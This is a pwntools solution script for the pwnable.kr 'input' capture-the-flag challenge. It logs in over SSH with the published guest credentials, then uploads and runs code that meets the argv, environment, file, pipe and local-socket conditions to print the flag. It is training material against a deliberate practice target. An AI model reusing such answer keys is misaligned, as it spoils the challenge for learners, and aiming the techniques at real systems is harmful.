from pwn import *

pwnfile = r"""
from pwn import *
import os

# argv
argv = []
for i in range(0, 100):
    if i == 0:
        argv.append("/home/input2/input")
    elif i == ord("A"):
        argv.append("\x00")
    elif i == ord("B"):
        argv.append("\x20\x0a\x0d")
    elif i == ord("C"):
        argv.append("8756")
    else:
        argv.append("nop")

# env
env = {"\xde\xad\xbe\xef": "\xca\xfe\xba\xbe"}

os.chdir("/tmp/leo/")
# file
with open("\x0a", "wb") as f:
    f.write("\x00" * 4)

# stdin
in_pipe_r, in_pipe_w = os.pipe()
err_pipe_r, err_pipe_w = os.pipe()
out_pipe_r, out_pipe_w = os.pipe()
os.write(in_pipe_w, "\x00\x0a\x00\xff")
os.write(err_pipe_w, "\x00\x0a\x02\xff")
sh = process(argv, executable="/home/input2/input", env=env, stdin=in_pipe_r, stderr=err_pipe_r)
sh.recvlines(7)

# network
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    try:
        s.connect(("127.0.0.1", 8756))
        break
    except socket.error:
        pass
s.send("\xde\xad\xbe\xef")
s.close()
flag = sh.recvlines(2)[1]
print(flag)

"""

con = ssh("input2", "pwnable.kr", 2222, "guest")
con.shell("mkdir /tmp/leo/ && cd /tmp/leo/ && ln -s /home/input2/flag /tmp/leo/flag")
con.upload_data(pwnfile, "/tmp/leo/pwnfile.py")
sh = con.run("python -i /tmp/leo/pwnfile.py")
print(sh.recv(1024))

# Mommy! I learned how to pass various input in Linux :)
